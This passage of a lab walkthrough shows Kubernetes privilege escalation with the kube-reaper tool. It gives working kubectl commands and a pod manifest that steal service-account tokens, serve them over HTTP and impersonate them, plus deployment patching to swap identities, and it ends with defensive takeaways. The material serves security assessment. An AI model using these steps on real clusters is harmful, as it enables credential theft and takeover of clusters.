[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server delete replicaset stealth-rs -n cicd
```

```
replicaset.apps "stealth-rs" deleted
```

---

## Scan 5: Identity Pivot via Pod SA Specification

When you create a pod in Kubernetes, you can set `serviceAccountName` in the pod spec. The API server mounts a projected token for that service account into the pod automatically. You do not need `get secrets` permission. You do not need `create serviceaccounts/token`. You just need `create pods` in a namespace where the target SA exists.

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) detects this. It cross-references your pod creation permissions with every service account in each namespace. If an SA has dangerous permissions, it builds an attack chain: create a pod as that SA, harvest the projected token, authenticate as the new identity.

From the admin scan, [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged multiple SA spec pivot chains:

```
Chain [CRITICAL] Identity Pivot via Pod SA Spec:
               kubernetes-admin -> clusterrole-aggregation-controller
────────────────────────────────────────────────────────────

  kubernetes-admin can create pods in kube-system and specify
  serviceAccountName. Create a pod as clusterrole-aggregation-controller
  to harvest its projected token. No secret read access needed.

  ├──▶ [kubernetes-admin@kube-system] Create pod with
  │     serviceAccountName: clusterrole-aggregation-controller
  │     (no PSS, privileged pod possible)
  │   → Pod runs as system:serviceaccount:kube-system:
  │     clusterrole-aggregation-controller, projected token
  │     auto-mounted (Code Execution)
  ├──▶ [kubernetes-admin@kube-system] Read
  │     /var/run/secrets/kubernetes.io/serviceaccount/token from pod
  │   → Token for system:serviceaccount:kube-system:
  │     clusterrole-aggregation-controller acquired
  │     (Credential Harvest)
  └──▶ Authenticate as clusterrole-aggregation-controller.
       SA has: Escalate Verb on ClusterRoles,
       Create/Modify ClusterRoles
      → Escalated permissions (Privilege Escalation)

  Final Capability: Privilege Escalation
```

This matters because most identity pivot techniques require reading secrets or minting tokens through the TokenRequest API. This path needs neither. If you can create pods in a namespace, you can become any service account in that namespace.

### Manual Validation: SA Spec Identity Pivot

We validate the exact chain [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged. The `clusterrole-aggregation-controller` SA in `kube-system` has the `escalate` verb on ClusterRoles, which bypasses RBAC escalation prevention. We create a pod in `kube-system` that runs as this SA, reads its projected token, and serves it over HTTP:

```bash
[k8s-control-plane-1] $ kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: sa-spec-test
  namespace: kube-system
spec:
  serviceAccountName: clusterrole-aggregation-controller
  hostNetwork: true
  containers:
  - name: harvest
    image: python:3-slim
    command: ["sh", "-c", "cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/stolen-token.txt && cd /tmp && python3 -m http.server 9999"]
EOF
```

```
pod/sa-spec-test created
```

The pod starts on worker-2 with `hostNetwork`, so the HTTP server is reachable at the node IP:

```bash
[k8s-control-plane-1] $ kubectl get pod sa-spec-test -n kube-system -o wide
```

```
NAME           READY   STATUS    RESTARTS   AGE   IP           NODE           
sa-spec-test   1/1     Running   0          5s    10.3.10.31   k8s-worker-2
```

We retrieve the projected token:

```bash
[k8s-control-plane-1] $ curl -s http://10.3.10.31:9999/stolen-token.txt -o /tmp/stolen-token.txt
```

Now we build a clean kubeconfig with the stolen token. A clean kubeconfig is important because if your kubeconfig has client certificates, kubectl uses them instead of the `--token` flag:

```bash
[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/pivot.yaml
[k8s-control-plane-1] $ kubectl config set-credentials pivot --token=$(cat /tmp/stolen-token.txt) --kubeconfig=/tmp/pivot.yaml
[k8s-control-plane-1] $ kubectl config set-context pivot --cluster=lab --user=pivot --kubeconfig=/tmp/pivot.yaml
[k8s-control-plane-1] $ kubectl config use-context pivot --kubeconfig=/tmp/pivot.yaml
```

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:kube-system:clusterrole-aggregation-controller
UID         79be7a4f-230d-4688-a8ce-409a4950484f
Groups      [system:serviceaccounts system:serviceaccounts:kube-system
             system:authenticated]
```

We are now `system:serviceaccount:kube-system:clusterrole-aggregation-controller`. Now verify the dangerous permissions that [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged:

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth can-i escalate clusterroles
```

```
yes
```

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth can-i update clusterroles
```

```
yes
```

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot.yaml auth can-i patch clusterroles
```

```
yes
```

Confirmed. This SA can `escalate`, `update`, and `patch` any ClusterRole. The `escalate` verb bypasses the Kubernetes RBAC escalation prevention check. This means this identity can add wildcard permissions to any ClusterRole, then bind that role to itself. That is a direct path to cluster-admin.

We created a pod, specified the SA, and harvested its projected token. We never read a secret. We never used the TokenRequest API. We just used `create pods`.

### Cleanup

```bash
[k8s-control-plane-1] $ kubectl delete pod sa-spec-test -n kube-system
```

```
pod "sa-spec-test" deleted
```

```bash
[k8s-control-plane-1] $ rm -f /tmp/stolen-token.txt /tmp/pivot.yaml
```

---

## Scan 6: Workload Mutation Identity Theft

Scan 5 showed how to steal an identity by creating a new pod with a target service account. Workload mutation does the same thing, but without creating a pod. Instead, you patch an existing Deployment, DaemonSet, or StatefulSet and change its `serviceAccountName` field. When the workload controller rolls out new pods, those pods run as the target identity. The API server mounts a projected token for the new SA automatically.

This matters in environments where admission webhooks or resource quotas block pod creation. If you cannot create pods but can patch deployments, workload mutation still works. It is the fallback path when the primary identity theft technique (Scan 5) is blocked.

In this lab, the code-server SA already has `create pods` permission, so workload mutation is redundant. The SA spec pivot from Scan 5 is a simpler path. We demonstrate this technique here to show what an attacker with only `patch deployments` permission (and no `create pods`) could do. In a locked-down environment, this could be the only identity theft vector available.

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) detects the `patch` and `update` verbs on `deployments`, `daemonsets`, and `statefulsets` as identity theft vectors. Each workload type has a different operational impact: DaemonSet mutations run on every node. StatefulSet mutations persist across restarts because of stable storage. Deployment mutations trigger a rolling update with one kubectl command.

From the code-server foothold scan:

```
● Patch Deployments (Identity Theft) (system:serviceaccount:development:code-server@cicd)
  │ Resource: deployments [get, list, watch, create, delete, patch]
  │ Attack: Patch Deployment spec.template.spec.serviceAccountName to
  │         a privileged SA -> new pods mount that SA's projected token
  │         -> harvest token from pod logs or exec.
  └ Enables: Privilege Escalation, Lateral Movement, Credential Harvest

● Patch Deployments (Identity Theft) (system:serviceaccount:development:code-server@development)
  │ Resource: deployments [get, list, watch, create, delete, patch]
  │ Attack: Patch Deployment spec.template.spec.serviceAccountName to
  │         a privileged SA -> new pods mount that SA's projected token
  │         -> harvest token from pod logs or exec.
  └ Enables: Privilege Escalation, Lateral Movement, Credential Harvest
```

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged this in both `cicd` and `development` namespaces. The code-server SA can patch deployments in both.

### Manual Validation: Workload Mutation

**Step 1: Confirm the permission.**

```bash
[k8s-control-plane-1] $ kubectl auth can-i patch deployments --as system:serviceaccount:development:code-server -n development
```

```
yes
```

```bash
[k8s-control-plane-1] $ kubectl auth can-i patch deployments --as system:serviceaccount:development:code-server -n cicd
```

```
yes
```

Code-server can patch deployments in both namespaces. It cannot patch DaemonSets or StatefulSets:

```bash
[k8s-control-plane-1] $ kubectl auth can-i patch daemonsets --as system:serviceaccount:development:code-server -n development
```

```
no
```

**Step 2: Find a target deployment and a target SA.**

```bash
[k8s-control-plane-1] $ kubectl get deployments -n development -o wide --as system:serviceaccount:development:code-server
```

```
NAME          READY   UP-TO-DATE   AVAILABLE   AGE    CONTAINERS    IMAGES                                      SELECTOR
code-server   1/1     1            1           3d5h   code-server   docker.io/codercom/code-server:4.107.0-39   app=code-server
```

The code-server deployment exists in the development namespace. It runs as the `code-server` service account. Now check what other service accounts exist:

```bash
[k8s-control-plane-1] $ kubectl get sa -n development
```

```
NAME          AGE
code-server   3d5h
default       3d5h
developer     3d5h
```

Three SAs exist: `code-server` (current), `default`, and `developer`. The attacker would target whichever SA has the most useful permissions. In this lab the `developer` SA has limited permissions (pods list/get, pods/portforward create). In a production cluster, this could be a CI/CD pipeline SA with secret read access or a monitoring SA with cluster-wide permissions.

**Step 3: Patch the deployment.**

We change the code-server deployment's `serviceAccountName` from `code-server` to `developer`:

```bash
[k8s-control-plane-1] $ kubectl patch deployment code-server -n development --as system:serviceaccount:development:code-server -p '{"spec":{"template":{"spec":{"serviceAccountName":"developer"}}}}'
```

```
deployment.apps/code-server patched
```

The patch triggers a rolling update. Kubernetes terminates the old pods and creates new ones with the `developer` SA:

```bash
[k8s-control-plane-1] $ kubectl rollout status deployment code-server -n development --timeout=60s
```

```
deployment "code-server" successfully rolled out
```

**Step 4: Verify the new pod runs as the target SA.**

```bash
[k8s-control-plane-1] $ kubectl get pods -n development -l app=code-server -o wide
```

```
NAME                           READY   STATUS    RESTARTS   AGE   IP              NODE           
code-server-5f5dd64b99-2thsz   1/1     Running   0          31s   10.244.140.36   k8s-worker-2
```

A new pod is running. The old pod was replaced during the rolling update.

**Step 5: Harvest the projected token and verify the stolen identity.**

Read the token from inside the new pod:

```bash
[k8s-control-plane-1] $ TOKEN=$(kubectl exec code-server-5f5dd64b99-2thsz -n development -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

Build a clean kubeconfig with the stolen token (a clean kubeconfig is necessary because client certificates in the default kubeconfig override the `--token` flag):

```bash
[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/mutation-test.yaml
[k8s-control-plane-1] $ kubectl config set-credentials stolen --token=$TOKEN --kubeconfig=/tmp/mutation-test.yaml
[k8s-control-plane-1] $ kubectl config set-context stolen --cluster=lab --user=stolen --kubeconfig=/tmp/mutation-test.yaml
[k8s-control-plane-1] $ kubectl config use-context stolen --kubeconfig=/tmp/mutation-test.yaml
```

Verify the identity:

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/mutation-test.yaml auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:development:developer
UID         28333d99-9b8e-4dff-b14f-f3b94dda9378
Groups      [system:serviceaccounts system:serviceaccounts:development
             system:authenticated]
```

We are now `system:serviceaccount:development:developer`. No pod was created. No secret was read. We patched one field on an existing deployment, and the Kubernetes controller did the rest. The rolling update replaced pods automatically, and the API server mounted a projected token for the target SA.

This technique has an operational advantage over the SA spec pivot in Scan 5: it does not leave an orphaned pod behind. The deployment controller manages the lifecycle. The pod looks normal in audit logs because it was created by the ReplicaSet controller, not directly by the attacker.

### Cleanup

```bash
[k8s-control-plane-1] $ kubectl patch deployment code-server -n development -p '{"spec":{"template":{"spec":{"serviceAccountName":"code-server"}}}}'
```

```
deployment.apps/code-server patched
```

```bash
[k8s-control-plane-1] $ rm -f /tmp/mutation-test.yaml
```

---

## Scan 7: DNS Service Discovery and Admission Controller Probing

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has two reconnaissance features that work without RBAC permissions for service listing or require only pod creation.

**DNS Service Discovery** queries the cluster DNS server (CoreDNS) for common service names across all known namespaces. It does not need any RBAC permissions. It reads `/etc/resolv.conf` to find the DNS server, then sends A record lookups for 48 common service names (kubernetes, kube-dns, grafana, vault, argocd-server, etc.) across every namespace. Any service that resolves tells the attacker it exists, what namespace it belongs to, and its ClusterIP.

**Admission Controller Probing** sends dry-run pod creates to map what the admission controller will accept or reject in each namespace. It uses `--dry-run=server`, so no pods are created. It tests six configurations: privileged, hostPID, hostNetwork, hostPath, CAP_SYS_ADMIN, and runAsRoot. The result tells the attacker exactly which dangerous pod configurations each namespace allows.

We run this from inside the code-server pod:

```bash
[code-server pod] $ /tmp/kube-reaper
```

The scan output now includes two new sections:

```
DNS Discovered Services: 3
Admission Controller: 2 probed (2 with weak enforcement)
```

### DNS Service Discovery

```
╔══════════════════════════════════════════════════╗
║           DNS SERVICE DISCOVERY                  ║
╚══════════════════════════════════════════════════╝
  DNS Server: 10.96.0.10
  Cluster Domain: cluster.local
  Search Domains: development.svc.cluster.local, svc.cluster.local,
                  cluster.local, home.arpa

  Namespace: calico-system
    ● calico-typha -> 10.102.20.240 (DNS A lookup)

  Namespace: default
    ● kubernetes -> 10.96.0.1 (DNS A lookup)

  Namespace: kube-system
    ● kube-dns -> 10.96.0.10 (DNS A lookup)
```

Without any RBAC permission to list services, [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found three services and their ClusterIPs. It also extracted the DNS server address (10.96.0.10), the cluster domain (cluster.local), and the search domains from `/etc/resolv.conf`.

### Admission Controller Probing

```
╔══════════════════════════════════════════════════╗
║           ADMISSION CONTROLLER PROBING            ║
╚══════════════════════════════════════════════════╝
  Dry-run pod probes (no pods created)

  ● cicd [NO ENFORCEMENT]  6/6 probes allowed
    │ privileged: ALLOWED
    │ hostPID: ALLOWED
    │ hostNetwork: ALLOWED
    │ hostPath: ALLOWED
    │ CAP_SYS_ADMIN: ALLOWED
    │ runAsRoot: ALLOWED

  ● development [PARTIAL]  1/6 probes allowed
    │ privileged: DENIED
    │   PodSecurity "baseline:latest": privileged
    │ hostPID: DENIED
    │   PodSecurity "baseline:latest": host namespaces
    │ hostNetwork: DENIED
    │   PodSecurity "baseline:latest": host namespaces
    │ hostPath: DENIED
    │   PodSecurity "baseline:latest": hostPath volumes
    │ CAP_SYS_ADMIN: DENIED
    │   PodSecurity "baseline:latest": non-default capabilities
    │ runAsRoot: ALLOWED
```

This tells us:
- **cicd** has no admission enforcement at all. Every dangerous pod configuration is allowed. This confirms the breakout chain from Scan 1.
- **development** uses PSS `baseline` enforcement. It blocks privileged containers, host namespaces, hostPath volumes, and dangerous capabilities. But it allows `runAsRoot` (UID 0). The PSS baseline policy does not restrict the user ID.

The 8 other namespaces do not appear because the code-server SA cannot create pods there. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) skips namespaces where RBAC blocks pod creation before testing admission.

### Manual Validation: DNS Discovery

We compare the DNS results against the actual cluster services. On the control plane as `kubernetes-admin`:

```bash
[k8s-control-plane-1] $ kubectl get svc -A
```

```
NAMESPACE          NAME                              TYPE        CLUSTER-IP      PORT(S)
calico-apiserver   calico-api                        ClusterIP   10.103.4.78     443/TCP
calico-system      calico-kube-controllers-metrics   ClusterIP   None            9094/TCP
calico-system      calico-typha                      ClusterIP   10.102.20.240   5473/TCP
default            kubernetes                        ClusterIP   10.96.0.1       443/TCP
kube-system        kube-dns                          ClusterIP   10.96.0.10      53/UDP,53/TCP
```

Five services exist in the cluster. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found three: `calico-typha` (10.102.20.240), `kubernetes` (10.96.0.1), and `kube-dns` (10.96.0.10). All three IPs match exactly. The two it missed (`calico-api` and `calico-kube-controllers-metrics`) have non-standard names not in the probe dictionary. This is a dictionary-based approach, so coverage depends on the service names. Three out of five with zero false positives from a pod that has no RBAC permission to list services.

### Manual Validation: Admission Probing

We verify the admission results with kubectl dry-run. All commands run on `k8s-control-plane-1`.

**Privileged pod in cicd (should be ALLOWED):**

```bash
[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server run kr-val-priv --image=busybox --restart=Never --dry-run=server -n cicd --overrides='{"spec":{"containers":[{"name":"probe","image":"busybox","command":["true"],"securityContext":{"privileged":true}}]}}' -o name
pod/kr-val-priv
```

Accepted. No admission controller blocked it.

**Privileged pod in development (should be DENIED):**

```bash
[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server run kr-val-priv --image=busybox --restart=Never --dry-run=server -n development --overrides='{"spec":{"containers":[{"name":"probe","image":"busybox","command":["true"],"securityContext":{"privileged":true}}]}}' -o name
```

```
Error from server (Forbidden): pods "kr-val-priv" is forbidden:
violates PodSecurity "baseline:latest": privileged
(container "probe" must not set securityContext.privileged=true)
```

Denied by PSS baseline. Exactly what [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) reported.

**RunAsRoot in development (should be ALLOWED):**

```bash
[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server run kr-val-root --image=busybox --restart=Never --dry-run=server -n development --overrides='{"spec":{"containers":[{"name":"probe","image":"busybox","command":["true"],"securityContext":{"runAsUser":0}}]}}' -o name
pod/kr-val-root
```

Accepted. PSS baseline does not block UID 0. This is a gap that defenders should know about. An attacker can still run containers as root in the development namespace, even with PSS baseline enforced.

---

## Putting It Together: The Full Attack Chain

Here is the complete path from developer pod to cluster admin, as [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) mapped it and as we validated manually:

```
Step 1: code-server SA (development namespace)
  │
  │ code-server has create pods permission in cicd
  │ cicd namespace has no PSS enforcement
  │ code-server has patch deployments in development and cicd
  │
  ├─── Path A: Privileged Pod Breakout ───────────────
  │
  ▼
Step 2a: Deploy privileged pod in cicd
  │
  │ Pod spec: privileged=true, hostPID, hostNetwork, hostPath=/
  │ API server accepts it (no PSS to block it)
  │ Pod runs on worker-2
  │
  ▼
Step 3a: Break out to node
  │
  │ chroot /mnt from inside privileged container
  │ Now root on k8s-worker-2
  │
  ▼
Step 4a: Steal credentials from node filesystem
  │
  │ Read projected SA tokens from /var/lib/kubelet/pods/
  │ Read kubelet client cert from /var/lib/kubelet/pki/
  │ Read SSH keys from /root/.ssh/
  │ 7 SA tokens recovered. Kubelet cert authenticates as system:node
  │
  ├─── Path B: SA Spec Identity Pivot ────────────────
  │
  ▼
Step 2b: Deploy pod with serviceAccountName set to target SA
  │
  │ Create pod in cicd with serviceAccountName: <target>
  │ API server mounts projected token for that SA automatically
  │ No secret read access needed
  │
  ▼
Step 3b: Harvest the projected token
  │
  │ Pod reads its own token from
  │ /var/run/secrets/kubernetes.io/serviceaccount/token
  │ Serves it over HTTP via hostNetwork
  │ Attacker retrieves token from the node IP
  │
  ▼
Step 4b: Authenticate as stolen identity
  │
  │ Build kubeconfig with harvested token
  │ Now operating as the target SA
  │ Repeat for each interesting SA in the namespace
  │
  ├─── Path C: Workload Mutation Identity Theft ───────
  │
  ▼
Step 2c: Patch existing deployment's serviceAccountName
  │
  │ kubectl patch deployment code-server -n development
  │   -p '{"spec":{"template":{"spec":{"serviceAccountName":"<target>"}}}}'
  │ No new pod created. Rolling update replaces pods automatically.
  │ New pods run as the target SA.
  │
  ▼
Step 3c: Harvest the projected token
  │
  │ kubectl exec into the rolled-out pod
  │ Read /var/run/secrets/kubernetes.io/serviceaccount/token
  │ Build kubeconfig with the stolen token
  │
  ▼
Step 4c: Authenticate as stolen identity
  │
  │ Now operating as the target SA
  │ Pod looks normal in audit logs (created by ReplicaSet controller)
  │ No orphaned attacker pod to clean up
  │
  ├─── All paths converge ─────────────────────────────
  │
  ▼
Step 5: Lateral movement
  │
  │ Use stolen calico-node SA token (privileged, hostNetwork,
  │ access to all nodes)
  │ Or SSH to control plane using recovered keys
  │ Or use kubelet cert to access node-bound secrets
  │ Or pivot through harvested SA identities
  │
  ▼
Step 6: Control plane access
  │
  │ Read /etc/kubernetes/admin.conf from control plane node
  │ This file contains the cluster-admin certificate
  │
  ▼
Step 7: Cluster admin
```

Path A is the privileged pod breakout. It gives you node-level access and every credential on that node. Path B is the SA spec identity pivot. It gives you a specific SA identity without touching the node at all. Both start from the same permission: `create pods` in a namespace with no PSS. Path C is workload mutation. It steals an identity by patching an existing deployment instead of creating a new pod. This works even when admission webhooks or resource quotas block pod creation.

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified Path A (steps 1 through 3a), Path B (steps 2b through 4b), and Path C (steps 2c through 4c) automatically. The admin scan with `--pivot` mapped the identity relationships that make step 5 onward possible. No manual RBAC review could piece this together as fast.

---

## Summary of [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) Capabilities

| Capability | What it does | Why it matters |
|-----------|-------------|----------------|
| **Permission enumeration** | Maps your exact RBAC rules across every namespace | Shows what you can touch, not just what roles you have |
| **Dangerous pattern matching** | 55 patterns matched against your permissions | Catches things beyond "can create pods" |
| **Attack chain analysis** | Chains permissions into multi-step escalation paths | Turns permission data into actionable attack plans |
| **Namespace PSS mapping** | Correlates pod creation with PSS enforcement | Identifies which namespaces allow privileged pods |
| **Pod security analysis** | Flags privileged pods, hostPath, hostPID, hostNetwork | Finds existing breakout-ready pods |
| **Recursive identity pivot** | Steals tokens, authenticates as each identity, repeats | Maps the full identity graph automatically |
| **RBAC graph enumeration** | Lists all roles, bindings, and identity profiles | Shows who has what across the entire cluster |
| **Secret triage** | Classifies accessible secrets by attack value | Highlights SA tokens, certs, and credentials |
| **CRD attack surface** | Identifies dangerous CRDs (Calico, Istio, etc.) | Catches service mesh and CNI misconfiguration |
| **SA spec identity pivot** | Detects pod creation + target SA in same namespace | Steals identities without reading secrets or minting tokens |
| **Workload mutation detection** | Detects patch/update on deployments, daemonsets, statefulsets | Catches identity theft via existing workloads when pod creation is blocked |
| **Unconventional pattern detection** | Flags escalate/bind verbs, direct ReplicaSet creation, webhook manipulation | Catches what other tools miss |
| **DNS service discovery** | Queries CoreDNS for 48 common service names across all namespaces | Finds services without RBAC permissions to list them |
| **Admission controller probing** | Dry-run pod creates test what each namespace allows | Maps enforcement gaps before you commit to an attack |
| **Severity filtering** | `--severity high` to focus on critical findings | Cuts noise during time-limited assessments |
| **Token authentication** | `--token` + `--server` for direct access | Works from compromised pods with no kubeconfig |

---

## Defensive Takeaways

What would have stopped this attack chain:

1. **Enforce PSS on the cicd namespace.** A `baseline` or `restricted` label would have blocked the privileged pod.
2. **Do not grant cross-namespace pod creation.** The code-server SA should not have permissions in cicd.
3. **Delete legacy SA token secrets.** The `developer-token` secret is a persistence risk.
4. **Separate list from get on secrets.** prod-debug-agent can list secret names cluster-wide. This leaks the names and types of all secrets.
5. **Audit the bind verb.** prod-debug-agent can bind roles in production. This is one step from privilege escalation.
6. **Monitor ReplicaSet creation.** Audit policies should catch direct ReplicaSet creation, not just Deployments.
7. **Use PSS `restricted` instead of `baseline` where possible.** The `baseline` policy allows `runAsRoot` (UID 0). An attacker can still run containers as root even with `baseline` enforced. The `restricted` policy blocks this.
8. **Apply admission enforcement to all namespaces.** The cicd namespace had zero enforcement. Any identity with pod creation in that namespace can deploy privileged containers with no admission check.
9. **Restrict patch/update on workloads.** An identity that can patch a Deployment, DaemonSet, or StatefulSet can change its `serviceAccountName` and steal any SA token in the namespace. Treat workload patch permissions as identity theft vectors, not just deployment management.

Run [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) against your own cluster. The output tells you exactly where the gaps are and how an attacker would use them.

---

## Credits

The Kubernetes attack lab used in this post was designed by [SpecterOps](https://specterops.io/). I adapted it to run in a Proxmox virtualization environment.
